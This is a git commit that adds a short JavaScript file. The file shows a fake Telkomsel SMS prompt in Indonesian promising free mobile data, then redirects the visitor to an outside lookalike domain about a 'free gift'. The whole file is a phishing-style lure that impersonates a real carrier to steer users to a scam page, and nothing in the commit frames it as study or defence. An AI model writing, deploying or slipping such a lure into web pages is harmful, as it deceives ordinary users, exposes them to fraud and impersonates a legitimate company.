0d913b3aa30ce1b7a3cd72368ddd0eadc3b387ff
mfednewblog9 <newekpeitid@gmail.com>
2025-12-15 10:55:29 +0100

    Create active-telkomsel.js

---
+++ active-telkomsel.js
@@ -0,0 +1,5 @@
+var password = 'MENGAKTIFKAN'
+password=prompt('SMS: Selamat, nomor Telkomsel Anda memenuhi syarat untuk menerima data gratis, klik OK untuk mengaktifkannya sekarang.','MENGAKTIFKAN');
+if (password != 'MENGAKTIFKAN') {
+location.href='https://fhreekift.org/telkomsel.html';
+}
